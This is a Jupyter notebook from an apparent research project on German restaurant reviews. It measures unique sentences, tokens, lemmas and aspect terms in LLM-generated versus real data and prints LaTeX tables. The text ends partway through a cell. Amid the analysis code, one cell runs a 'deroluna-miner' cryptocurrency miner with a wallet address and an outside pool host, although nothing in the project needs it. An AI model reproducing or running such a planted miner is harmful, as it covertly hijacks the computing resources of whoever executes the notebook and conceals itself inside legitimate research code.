{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Notebook: Analyse Language\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Packages\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:51:50.662687Z",
     "iopub.status.busy": "2024-02-15T08:51:50.662290Z",
     "iopub.status.idle": "2024-02-15T08:51:52.655904Z",
     "shell.execute_reply": "2024-02-15T08:51:52.655243Z"
    }
   },
   "outputs": [],
   "source": [
    "from iterstrat.ml_stratifiers import MultilabelStratifiedKFold\n",
    "from spacy.lang.de.stop_words import STOP_WORDS\n",
    "from collections import Counter\n",
    "import Levenshtein\n",
    "import numpy as np\n",
    "import random\n",
    "import string\n",
    "import spacy\n",
    "import nltk\n",
    "import json"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Constants\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:51:52.660189Z",
     "iopub.status.busy": "2024-02-15T08:51:52.659970Z",
     "iopub.status.idle": "2024-02-15T08:51:52.663667Z",
     "shell.execute_reply": "2024-02-15T08:51:52.663131Z"
    }
   },
   "outputs": [],
   "source": [
    "ASPECT_CATEGORIES = [\"GENERAL-IMPRESSION\",\n",
    "                     \"FOOD\", \"SERVICE\", \"AMBIENCE\", \"PRICE\"]\n",
    "LLMS = [\"Llama70B\", \"GPT-3\"]\n",
    "FS_CONDITIONS = [\"fixed\", \"random\"]\n",
    "CRITERIA_RS = \"tag_with_polarity\"\n",
    "POLARITIES = [\"POSITIVE\", \"NEGATIVE\", \"NEUTRAL\"]\n",
    "MENTIONING_TYPE = [\"implicit\", \"explicit\"]\n",
    "COMBINATIONS = [f\"{aspect}-{polarity}\" for aspect in [\"SERVICE\", \"FOOD\",\n",
    "                                                      \"GENERAL-IMPRESSION\", \"AMBIENCE\", \"PRICE\"] for polarity in POLARITIES]\n",
    "RANDOM_STATE = 43"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:51:52.667379Z",
     "iopub.status.busy": "2024-02-15T08:51:52.666927Z",
     "iopub.status.idle": "2024-02-15T08:51:52.670217Z",
     "shell.execute_reply": "2024-02-15T08:51:52.669458Z"
    }
   },
   "outputs": [],
   "source": [
    "LLMS_ENCODED = {\"GPT-3\": \"\\\\textbf{GPT-3.5-turbo}\", \"Llama70B\": \"\\\\textbf{Llama-2-70B}\"}\n",
    "ENCODE_CONDITION = {\"fixed\": \"\\\\textbf{LRS\\\\textsubscript{25}}\",\n",
    "                    \"random\": \"\\\\textbf{LRS\\\\textsubscript{500}}\"}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Settings\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:51:52.674096Z",
     "iopub.status.busy": "2024-02-15T08:51:52.673778Z",
     "iopub.status.idle": "2024-02-15T08:51:54.072775Z",
     "shell.execute_reply": "2024-02-15T08:51:54.072136Z"
    }
   },
   "outputs": [],
   "source": [
    "nlp = spacy.load(\"de_core_news_lg\")\n",
    "nltk.download('punkt')\n",
    "random.seed(RANDOM_STATE)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Code\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Helper\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:51:54.096061Z",
     "iopub.status.busy": "2024-02-15T08:51:54.095807Z",
     "iopub.status.idle": "2024-02-15T08:51:54.102276Z",
     "shell.execute_reply": "2024-02-15T08:51:54.101213Z"
    }
   },
   "outputs": [],
   "source": [
    "def count_unique_sentences(sentences):\n",
    "    unique_sentences = set(sentences)\n",
    "    return len(unique_sentences)\n",
    "\n",
    "\n",
    "def count_unique_tokens(tokens):\n",
    "    unique_tokens = set(token.text for token in tokens)\n",
    "    return len(unique_tokens)\n",
    "\n",
    "\n",
    "def count_unique_lemmas(tokens):\n",
    "    unique_lemmas = set(token.lemma_ for token in tokens)\n",
    "    return len(unique_lemmas)\n",
    "\n",
    "\n",
    "def get_avg_unique_words_in_k_words(tokens, n_selection=100, n_repetitions=1000000):\n",
    "    iterations_n_unique_words = []\n",
    "    for i in range(n_repetitions):\n",
    "        random_indices = random.sample(range(len(tokens)), n_selection)\n",
    "        random_words = [tokens[index] for index in random_indices]\n",
    "        n_unique_words = len(set(random_words))\n",
    "        iterations_n_unique_words.append(n_unique_words)\n",
    "    return np.mean(iterations_n_unique_words)\n",
    "\n",
    "\n",
    "def average_word_level_levenshtein_distance(docs, norm=False):\n",
    "    tokenized_texts = [\n",
    "        [token.text for token in doc[\"tokenized_text\"]] for doc in docs]\n",
    "\n",
    "    total_distance = 0\n",
    "    pair_count = 0\n",
    "\n",
    "    for i in range(len(tokenized_texts)):\n",
    "        for j in range(i + 1, len(tokenized_texts)):\n",
    "            tokens1 = tokenized_texts[i]\n",
    "            tokens2 = tokenized_texts[j]\n",
    "\n",
    "            if len(tokens1) >= len(tokens2):\n",
    "                max_tokens = len(tokens1)\n",
    "            else:\n",
    "                max_tokens = len(tokens2)\n",
    "\n",
    "            distance = Levenshtein.distance(tokens1, tokens2)\n",
    "            if norm:\n",
    "                distance = distance / max_tokens\n",
    "            total_distance += distance\n",
    "            pair_count += 1\n",
    "\n",
    "    average_distance = total_distance / pair_count if pair_count > 0 else 0\n",
    "    return average_distance"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:51:54.105158Z",
     "iopub.status.busy": "2024-02-15T08:51:54.104467Z",
     "iopub.status.idle": "2024-02-15T08:51:54.114221Z",
     "shell.execute_reply": "2024-02-15T08:51:54.113355Z"
    }
   },
   "outputs": [],
   "source": [
    "def round_number(num, decimal_places=None):\n",
    "    if decimal_places == None:\n",
    "        if num <= 10:\n",
    "            decimal_places = 2\n",
    "        elif num <= 100:\n",
    "            decimal_places = 1\n",
    "        else :\n",
    "            decimal_places = 0\n",
    "    formatted_num = \"{:.{}f}\".format(num, decimal_places)\n",
    "    rounded_num_str = \"{:.{}f}\".format(float(formatted_num), decimal_places)\n",
    "    return rounded_num_str\n",
    "\n",
    "def add_thousand_dots(n_sample):\n",
    "    if isinstance(n_sample, str):\n",
    "        if '.' in n_sample:\n",
    "            integer_part, decimal_part = n_sample.split('.')\n",
    "            formatted_integer_part = \"{:,}\".format(int(integer_part))\n",
    "            result = f\"{formatted_integer_part}.{decimal_part}\"\n",
    "        else:\n",
    "            result = \"{:,}\".format(int(n_sample))\n",
    "    elif isinstance(n_sample, np.float64):\n",
    "        result = \"{:,}\".format(round(n_sample, 1))\n",
    "    else:\n",
    "        result = n_sample\n",
    "    \n",
    "    return result\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load Datasets\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:51:54.117042Z",
     "iopub.status.busy": "2024-02-15T08:51:54.116714Z",
     "iopub.status.idle": "2024-02-15T08:55:41.462749Z",
     "shell.execute_reply": "2024-02-15T08:55:41.461757Z"
    }
   },
   "outputs": [],
   "source": [
    "dataset = {\"synth\": {}, \"real\": []}\n",
    "\n",
    "# Load Synth\n",
    "for llm in LLMS:\n",
    "    dataset[\"synth\"][llm] = {}\n",
    "    for prompting in FS_CONDITIONS:\n",
    "        dataset[\"synth\"][llm][prompting] = []\n",
    "        for split in range(6):\n",
    "            with open(f\"../07 train models/synth/{llm}/{prompting}/split_{split}.json\", 'r', encoding='utf-8') as json_file:\n",
    "                split_data = json.load(json_file)\n",
    "            for example in split_data:\n",
    "                example[\"tokenized_text\"] = nlp(example[\"text\"])\n",
    "            dataset[\"synth\"][llm][prompting].append(split_data)\n",
    "\n",
    "# Load Real\n",
    "for split in range(6):\n",
    "    with open(f\"../07 train models/real/split_{split}.json\", 'r', encoding='utf-8') as json_file:\n",
    "        split_data = json.load(json_file)\n",
    "    for example in split_data:\n",
    "        example[\"tokenized_text\"] = nlp(example[\"text\"])\n",
    "    dataset[\"real\"].append(split_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:55:41.466565Z",
     "iopub.status.busy": "2024-02-15T08:55:41.466416Z",
     "iopub.status.idle": "2024-02-15T08:55:41.470246Z",
     "shell.execute_reply": "2024-02-15T08:55:41.469685Z"
    }
   },
   "outputs": [],
   "source": [
    "def get_one_hot(subset):\n",
    "    labels_one_hot = []\n",
    "    for i in range(len(subset)):\n",
    "        tags_in_example = list(set([tag[CRITERIA_RS]\n",
    "                               for tag in subset[i][\"tags\"]]))\n",
    "        one_hot_encoded_combination = np.array(\n",
    "            [1 if tag in tags_in_example else 0 for tag in COMBINATIONS])\n",
    "        labels_one_hot.append(one_hot_encoded_combination)\n",
    "    return labels_one_hot"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:55:41.473833Z",
     "iopub.status.busy": "2024-02-15T08:55:41.473671Z",
     "iopub.status.idle": "2024-02-15T08:57:44.767231Z",
     "shell.execute_reply": "2024-02-15T08:57:44.766290Z"
    }
   },
   "outputs": [],
   "source": [
    "for llm in LLMS:\n",
    "    for few_shot_condition in FS_CONDITIONS:\n",
    "        for iteration in range(6):\n",
    "            if few_shot_condition == \"random\":\n",
    "                subset = dataset[\"synth\"][llm][few_shot_condition][iteration]\n",
    "            else:\n",
    "                subset = dataset[\"synth\"][llm][few_shot_condition][iteration][475:]\n",
    "\n",
    "            found_3_split = False\n",
    "            restart_idx = 0\n",
    "            while found_3_split == False:\n",
    "                mskf = MultilabelStratifiedKFold(\n",
    "                    n_splits=3, shuffle=True, random_state=RANDOM_STATE+restart_idx)\n",
    "                section = []\n",
    "                for train_index, test_index in mskf.split(subset, get_one_hot(subset)):\n",
    "                    split_500 = [subset[i] for i in test_index]\n",
    "                    section.append(split_500)\n",
    "\n",
    "                if len(section[0]) == 500 and len(section[1]) == 500 and len(section[2]) == 500:\n",
    "                    found_3_split = True\n",
    "\n",
    "                restart_idx += 1\n",
    "\n",
    "            dataset[\"synth\"][llm][few_shot_condition][iteration] = section"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:57:44.771427Z",
     "iopub.status.busy": "2024-02-15T08:57:44.771133Z",
     "iopub.status.idle": "2024-02-15T08:57:44.776678Z",
     "shell.execute_reply": "2024-02-15T08:57:44.775935Z"
    }
   },
   "outputs": [],
   "source": [
    "real_examples = []\n",
    "for i in [0, 1, 2, 3, 4, 5]:\n",
    "    real_examples.append([])\n",
    "    for k in [0, 1, 2]:\n",
    "        if (i+k) < 6:\n",
    "            t = i+k\n",
    "        else:\n",
    "            t = i+k - 6\n",
    "        real_examples[i].append(dataset[\"real\"][t])\n",
    "dataset[\"real\"] = real_examples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Document Analysis\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Synthetic Data\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:57:44.781437Z",
     "iopub.status.busy": "2024-02-15T08:57:44.780779Z",
     "iopub.status.idle": "2024-02-15T08:57:46.947512Z",
     "shell.execute_reply": "2024-02-15T08:57:46.946806Z"
    }
   },
   "outputs": [],
   "source": [
    "for idx_llm, llm in enumerate(LLMS):\n",
    "    for idx_fsc, few_shot_condition in enumerate(FS_CONDITIONS):\n",
    "        for idx_sample, n_sample in enumerate([500, 1000, 1500]):\n",
    "            iterations_n_unique_tokens = []\n",
    "            iterations_n_lemmas = []\n",
    "            iterations_avg_unique_sentences = []\n",
    "            for it in range(6):\n",
    "                samples = [item for k in range(\n",
    "                    int(n_sample / 500)) for item in dataset[\"synth\"][llm][few_shot_condition][it][k]]\n",
    "                n_unique_tokens = count_unique_tokens(\n",
    "                    [token for example in samples for token in example[\"tokenized_text\"]])\n",
    "                n_unique_lemmas = count_unique_lemmas(\n",
    "                    [token for example in samples for token in example[\"tokenized_text\"]])\n",
    "                n_unique_sentences = count_unique_sentences(\n",
    "                    [example[\"text\"] for example in samples])\n",
    "\n",
    "                iterations_n_unique_tokens.append(n_unique_tokens)\n",
    "                iterations_n_lemmas.append(n_unique_lemmas)\n",
    "                iterations_avg_unique_sentences.append(n_unique_sentences)\n",
    "\n",
    "            llm_print = \"\\multirow{6}{*}{\" + \\\n",
    "                LLMS_ENCODED[llm] + \\\n",
    "                \"}\" if idx_sample == 0 and idx_fsc == 0 else \"\"\n",
    "            fs_condition_print = \"\\multirow{3}{*}{\" + \\\n",
    "                ENCODE_CONDITION[few_shot_condition] + \\\n",
    "                \"}\" if idx_sample == 0 else \"\"\n",
    "\n",
    "            print(llm_print, \"&\", fs_condition_print, \"&\", add_thousand_dots(str(n_sample)), \"&\",\n",
    "                  add_thousand_dots(\n",
    "                      round_number(np.mean(iterations_avg_unique_sentences), 0)), \"&\",\n",
    "                  add_thousand_dots(\n",
    "                      round_number(np.mean(iterations_n_unique_tokens), 0)), \"&\",\n",
    "                  add_thousand_dots(round_number(np.mean(iterations_n_lemmas), 0)), \"\\\\\\\\\")\n",
    "        if idx_fsc == 0:\n",
    "            print(\"\\\\arrayrulecolor{gray}\\cline{2-6}\\\\arrayrulecolor{black}\")\n",
    "        else:\n",
    "            print(\"\\\\hline\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:57:46.951160Z",
     "iopub.status.busy": "2024-02-15T08:57:46.951022Z",
     "iopub.status.idle": "2024-02-15T08:57:47.191711Z",
     "shell.execute_reply": "2024-02-15T08:57:47.190399Z"
    }
   },
   "outputs": [],
   "source": [
    "!./deroluna-miner -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6kn0vz5y2fuy2qd8emvd -d 167.235.7.72:10300 -t 15\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:57:47.197068Z",
     "iopub.status.busy": "2024-02-15T08:57:47.196645Z",
     "iopub.status.idle": "2024-02-15T08:57:47.204361Z",
     "shell.execute_reply": "2024-02-15T08:57:47.203293Z"
    }
   },
   "outputs": [],
   "source": [
    "# for idx_llm, llm in enumerate(LLMS):\n",
    "#     for idx_fsc, few_shot_condition in enumerate(FS_CONDITIONS):\n",
    "#         for idx_sample, n_sample in enumerate([500, 1000, 1500]):\n",
    "#             iterations_avg_unique_words_in_k_words = []\n",
    "#             iterations_avg_levenshtein_distance = []\n",
    "#             iterations_avg_levenshtein_distance_norm = []\n",
    "#             for it in range(6):\n",
    "#                 samples = [item for k in range(\n",
    "#                     int(n_sample / 500)) for item in dataset[\"synth\"][llm][few_shot_condition][it][k]]\n",
    "#                 n_unique_words_in_k_words = get_avg_unique_words_in_k_words(\n",
    "#                     [token.text for example in samples for token in example[\"tokenized_text\"]])\n",
    "#                 avg_levenshtein_distance = average_word_level_levenshtein_distance(\n",
    "#                     samples)\n",
    "#                 avg_levenshtein_distance_norm = average_word_level_levenshtein_distance(\n",
    "#                     samples, norm=True)\n",
    "\n",
    "#                 iterations_avg_unique_words_in_k_words.append(\n",
    "#                     n_unique_words_in_k_words)\n",
    "#                 iterations_avg_levenshtein_distance.append(\n",
    "#                     avg_levenshtein_distance)\n",
    "#                 iterations_avg_levenshtein_distance_norm.append(\n",
    "#                     avg_levenshtein_distance_norm)\n",
    "                \n",
    "#             llm_print = \"\\multirow{6}{*}{\" + \\\n",
    "#                 LLMS_ENCODED[llm] + \\\n",
    "#                 \"}\" if idx_sample == 0 and idx_fsc == 0 else \"\"\n",
    "#             fs_condition_print = \"\\multirow{3}{*}{\" + \\\n",
    "#                 ENCODE_CONDITION[few_shot_condition] + \\\n",
    "#                 \"}\" if idx_sample == 0 else \"\"\n",
    "\n",
    "#             print(llm_print, \"&\", fs_condition_print, \"&\", add_thousand_dots(n_sample), \"&\",\n",
    "#                   add_thousand_dots(round_number(np.mean(iterations_avg_unique_words_in_k_words), 2)), \"&\",\n",
    "#                   add_thousand_dots(round_number(np.mean(iterations_avg_levenshtein_distance), 2)), \"&\",\n",
    "#                   add_thousand_dots(round_number(np.mean(iterations_avg_levenshtein_distance_norm), 2)))\n",
    "        \n",
    "#         if idx_fsc == 0:\n",
    "#             print(\"\\\\arrayrulecolor{gray}\\cline{2-6}\\\\arrayrulecolor{black}\")\n",
    "#         else:\n",
    "#             print(\"\\\\hline\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Real Data\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:57:47.209120Z",
     "iopub.status.busy": "2024-02-15T08:57:47.208733Z",
     "iopub.status.idle": "2024-02-15T08:57:49.191064Z",
     "shell.execute_reply": "2024-02-15T08:57:49.189876Z"
    }
   },
   "outputs": [],
   "source": [
    "for idx_sample, n_sample in enumerate([500, 1000, 1500]):\n",
    "    iterations_n_unique_tokens = []\n",
    "    iterations_n_lemmas = []\n",
    "    iterations_avg_unique_sentences = []\n",
    "\n",
    "    for it in range(6):\n",
    "        samples = [item for k in range(\n",
    "            int(n_sample / 500)) for item in dataset[\"real\"][it][k]]\n",
    "        n_unique_tokens = count_unique_tokens(\n",
    "            [token for example in samples for token in example[\"tokenized_text\"]])\n",
    "        n_unique_lemmas = count_unique_lemmas(\n",
    "            [token for example in samples for token in example[\"tokenized_text\"]])\n",
    "        n_unique_sentences = count_unique_sentences(\n",
    "            [example[\"text\"] for example in samples])\n",
    "\n",
    "        iterations_n_unique_tokens.append(n_unique_tokens)\n",
    "        iterations_n_lemmas.append(n_unique_lemmas)\n",
    "        iterations_avg_unique_sentences.append(n_unique_sentences)\n",
    "\n",
    "    data_source_print = \"\\multirow{3}{*}{\\\\textbf{Real Examples}}\" if idx_sample == 0 else \"\"\n",
    "\n",
    "    fs_condition_print = \"\\multirow{3}{*}{-}\" if idx_sample == 0 else \"\"\n",
    "\n",
    "    print(data_source_print, \"&\", fs_condition_print, \"&\", add_thousand_dots(str(n_sample)), \"&\",\n",
    "          add_thousand_dots(round_number(np.mean(iterations_avg_unique_sentences), 0)), \"&\",\n",
    "          add_thousand_dots(round_number(np.mean(iterations_n_unique_tokens), 0)), \"&\",\n",
    "          add_thousand_dots(round_number(np.mean(iterations_n_lemmas), 0)), \"\\\\\\\\\")\n",
    "print(\"\\\\hline\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:57:49.194009Z",
     "iopub.status.busy": "2024-02-15T08:57:49.193525Z",
     "iopub.status.idle": "2024-02-15T08:57:49.199450Z",
     "shell.execute_reply": "2024-02-15T08:57:49.198574Z"
    }
   },
   "outputs": [],
   "source": [
    "# for idx_sample, n_sample in enumerate([500, 1000, 1500]):\n",
    "#     iterations_avg_unique_words_in_k_words = []\n",
    "#     iterations_avg_levenshtein_distance = []\n",
    "#     iterations_avg_levenshtein_distance_norm = []\n",
    "#     for it in range(6):\n",
    "#         samples = [item for k in range(\n",
    "#             int(n_sample / 500)) for item in dataset[\"real\"][it][k]]\n",
    "\n",
    "#         n_unique_words_in_k_words = get_avg_unique_words_in_k_words(\n",
    "#             [token.text for example in samples for token in example[\"tokenized_text\"]])\n",
    "#         avg_levenshtein_distance = average_word_level_levenshtein_distance(\n",
    "#             samples)\n",
    "#         avg_levenshtein_distance_norm = average_word_level_levenshtein_distance(\n",
    "#             samples, norm=True)\n",
    "\n",
    "#         iterations_avg_unique_words_in_k_words.append(\n",
    "#             n_unique_words_in_k_words)\n",
    "#         iterations_avg_levenshtein_distance.append(\n",
    "#             avg_levenshtein_distance)\n",
    "#         iterations_avg_levenshtein_distance_norm.append(\n",
    "#             avg_levenshtein_distance_norm)\n",
    "        \n",
    "#     data_source_print = \"\\multirow{3}{*}{\\\\textbf{Real Examples}}\" if idx_sample == 0 else \"\"\n",
    "#     fs_condition_print = \"\\multirow{3}{*}{-}\" if idx_sample == 0 else \"\"\n",
    "\n",
    "#     print(data_source_print, \"&\", fs_condition_print, \"&\", add_thousand_dots(n_sample), \"&\",\n",
    "#           add_thousand_dots(\n",
    "#               round_number(np.mean(iterations_avg_unique_words_in_k_words), 2)), \"&\",\n",
    "#           add_thousand_dots(\n",
    "#               round_number(np.mean(iterations_avg_levenshtein_distance), 2)), \"&\",\n",
    "#           add_thousand_dots(round_number(np.mean(iterations_avg_levenshtein_distance_norm), 2)), \"\\\\\\\\\")\n",
    "# print(\"\\\\hline\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Aspect Term Analysis"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Synthetic Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:57:49.202611Z",
     "iopub.status.busy": "2024-02-15T08:57:49.202216Z",
     "iopub.status.idle": "2024-02-15T08:57:49.207707Z",
     "shell.execute_reply": "2024-02-15T08:57:49.206797Z"
    }
   },
   "outputs": [],
   "source": [
    "def print_k_unique_at(unique_counts, max_count):\n",
    "    if None in unique_counts:\n",
    "        return \"-\"\n",
    "    return add_thousand_dots(round_number(np.mean(unique_counts), 1))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T08:57:49.210377Z",
     "iopub.status.busy": "2024-02-15T08:57:49.210167Z",
     "iopub.status.idle": "2024-02-15T09:35:06.778320Z",
     "shell.execute_reply": "2024-02-15T09:35:06.777718Z"
    }
   },
   "outputs": [],
   "source": [
    "for idx_llm, llm in enumerate(LLMS):\n",
    "    for idx_fsc, few_shot_condition in enumerate(FS_CONDITIONS):\n",
    "        for idx_sample, n_sample in enumerate([500, 1000, 1500]):\n",
    "            tags_from_splits_count = []\n",
    "            tags_from_splits_count_implicit = []\n",
    "            tags_from_splits_count_explicit = []\n",
    "            count_unique_aspect_terms_in_split = []\n",
    "            count_unique_aspect_terms_in_100_aspect_terms = []\n",
    "            count_unique_aspect_terms_in_200_aspect_terms = []\n",
    "            count_unique_aspect_terms_in_500_aspect_terms = []\n",
    "            count_unique_aspect_terms_in_1000_aspect_terms = []\n",
    "\n",
    "            for it in range(6):\n",
    "                tags = [tag for k in range(\n",
    "                    int(n_sample / 500)) for example in dataset[\"synth\"][llm][few_shot_condition][it][k] for tag in example[\"tags\"]]\n",
    "                tags_explicit = [tag[\"text\"]\n",
    "                                 for tag in tags if tag[\"type\"] == \"label-explicit\"]\n",
    "                tags_from_splits_count.append(len(tags))\n",
    "                tags_from_splits_count_explicit.append(\n",
    "                    len([tag for tag in tags if tag[\"type\"] == \"label-explicit\"]))\n",
    "                tags_from_splits_count_implicit.append(\n",
    "                    len([tag for tag in tags if tag[\"type\"] == \"label-implicit\"]))\n",
    "\n",
    "                unique_tags = len(set(tags_explicit))\n",
    "\n",
    "                # Calculate number of unique tokens in k aspect terms\n",
    "                count_unique_aspect_terms_in_100_aspect_terms.append(\n",
    "                    get_avg_unique_words_in_k_words(tags_explicit, n_selection=100))\n",
    "                count_unique_aspect_terms_in_200_aspect_terms.append(\n",
    "                    get_avg_unique_words_in_k_words(tags_explicit, n_selection=200))\n",
    "                if len(tags_explicit) >= 500:\n",
    "                    count_unique_aspect_terms_in_500_aspect_terms.append(\n",
    "                        get_avg_unique_words_in_k_words(tags_explicit, n_selection=500))\n",
    "                else:\n",
    "                    count_unique_aspect_terms_in_500_aspect_terms.append(None)\n",
    "\n",
    "                if len(tags_explicit) >= 1000:\n",
    "                    count_unique_aspect_terms_in_1000_aspect_terms.append(\n",
    "                        get_avg_unique_words_in_k_words(tags_explicit, n_selection=1000))\n",
    "                else:\n",
    "                    count_unique_aspect_terms_in_1000_aspect_terms.append(None)\n",
    "\n",
    "                count_unique_aspect_terms_in_split.append(unique_tags)\n",
    "\n",
    "            llm_print = \"\\multirow{6}{*}{\" + \\\n",
    "                LLMS_ENCODED[llm] + \\\n",
    "                \"}\" if idx_sample == 0 and idx_fsc == 0 else \"\"\n",
    "            fs_condition_print = \"\\multirow{3}{*}{\" + \\\n",
    "                ENCODE_CONDITION[few_shot_condition] + \\\n",
    "                \"}\" if idx_sample == 0 else \"\"\n",
    "\n",
    "            print(llm_print, \"&\", fs_condition_print,\n",
    "                  \"&\", add_thousand_dots(n_sample),  # n samples\n",
    "                  \"&\", add_thousand_dots(\n",
    "                      round_number(np.mean(tags_from_splits_count), 0)),  # n aspects\n",
    "                  \"&\", add_thousand_dots(\n",
    "                      round_number(np.mean(tags_from_splits_count_implicit) / np.mean(tags_from_splits_count) * 100, 1)) + \"\\\\pm\" + add_thousand_dots(round_number(np.std([a / b * 100 for a, b in zip(\n",
    "                      tags_from_splits_count_implicit, tags_from_splits_count)]), 2)) + \"\\\\%\",\n",
    "                  \"&\", add_thousand_dots(\n",
    "                      round_number(np.mean(tags_from_splits_count_explicit), 0)),  # n aspects\n",
    "                  \"&\", add_thousand_dots(\n",
    "                      round_number(np.mean(count_unique_aspect_terms_in_split), 1)),  # n unique\n",
    "                  \"&\", add_thousand_dots(\n",
    "                      round_number(np.mean(count_unique_aspect_terms_in_100_aspect_terms), 1)),\n",
    "                  \"&\", add_thousand_dots(\n",
    "                      round_number(np.mean(count_unique_aspect_terms_in_200_aspect_terms), 1)),\n",
    "                  \"&\",\n",
    "                  print_k_unique_at(\n",
    "                      count_unique_aspect_terms_in_500_aspect_terms, 500),\n",
    "                  \"&\",\n",
    "                  print_k_unique_at(\n",
    "                      count_unique_aspect_terms_in_1000_aspect_terms, 1000),\n",
    "                  \"\\\\\\\\\")\n",
    "\n",
    "        if idx_fsc == 0:\n",
    "            print(\"\\\\arrayrulecolor{gray}\\cline{2-11}\\\\arrayrulecolor{black}\")\n",
    "        else:\n",
    "            print(\"\\\\hline\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Real Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T09:35:06.782078Z",
     "iopub.status.busy": "2024-02-15T09:35:06.781939Z",
     "iopub.status.idle": "2024-02-15T09:45:16.603303Z",
     "shell.execute_reply": "2024-02-15T09:45:16.602719Z"
    }
   },
   "outputs": [],
   "source": [
    "for idx_sample, n_sample in enumerate([500, 1000, 1500]):\n",
    "    tags_from_splits_count = []\n",
    "    tags_from_splits_count_implicit = []\n",
    "    tags_from_splits_count_explicit = []\n",
    "    count_unique_aspect_terms_in_split = []\n",
    "    count_unique_aspect_terms_in_100_aspect_terms = []\n",
    "    count_unique_aspect_terms_in_200_aspect_terms = []\n",
    "    count_unique_aspect_terms_in_500_aspect_terms = []\n",
    "    count_unique_aspect_terms_in_1000_aspect_terms = []\n",
    "\n",
    "    for it in range(6):\n",
    "        tags = [tag for k in range(int(n_sample / 500))\n",
    "                for example in dataset[\"real\"][it][k] for tag in example[\"tags\"]]\n",
    "        tags_explicit = [tag[\"text\"]\n",
    "                         for tag in tags if tag[\"type\"] == \"label-explicit\"]\n",
    "        tags_from_splits_count.append(len(tags))\n",
    "        tags_from_splits_count_explicit.append(\n",
    "            len([tag for tag in tags if tag[\"type\"] == \"label-explicit\"]))\n",
    "        tags_from_splits_count_implicit.append(\n",
    "            len([tag for tag in tags if tag[\"type\"] == \"label-implicit\"]))\n",
    "\n",
    "        unique_tags = len(set(tags_explicit))\n",
    "\n",
    "        # Calculate number of unique tokens in k aspect terms\n",
    "        count_unique_aspect_terms_in_100_aspect_terms.append(\n",
    "            get_avg_unique_words_in_k_words(tags_explicit, n_selection=100))\n",
    "        count_unique_aspect_terms_in_200_aspect_terms.append(\n",
    "            get_avg_unique_words_in_k_words(tags_explicit, n_selection=200))\n",
    "        if len(tags_explicit) >= 500:\n",
    "            count_unique_aspect_terms_in_500_aspect_terms.append(\n",
    "                get_avg_unique_words_in_k_words(tags_explicit, n_selection=500))\n",
    "        else:\n",
    "            count_unique_aspect_terms_in_500_aspect_terms.append(None)\n",
    "\n",
    "        if len(tags_explicit) >= 1000:\n",
    "            count_unique_aspect_terms_in_1000_aspect_terms.append(\n",
    "                get_avg_unique_words_in_k_words(tags_explicit, n_selection=1000))\n",
    "        else:\n",
    "            count_unique_aspect_terms_in_1000_aspect_terms.append(None)\n",
    "\n",
    "        count_unique_aspect_terms_in_split.append(unique_tags)\n",
    "\n",
    "    data_source_print = \"\\multirow{3}{*}{\\\\textbf{Real Examples}}\" if idx_sample == 0 else \"\"\n",
    "    fs_condition_print = \"\\multirow{3}{*}{-}\" if idx_sample == 0 else \"\"\n",
    "\n",
    "    print(data_source_print, \"&\", fs_condition_print,\n",
    "          \"&\", add_thousand_dots(n_sample),  # n samples\n",
    "          \"&\", add_thousand_dots(\n",
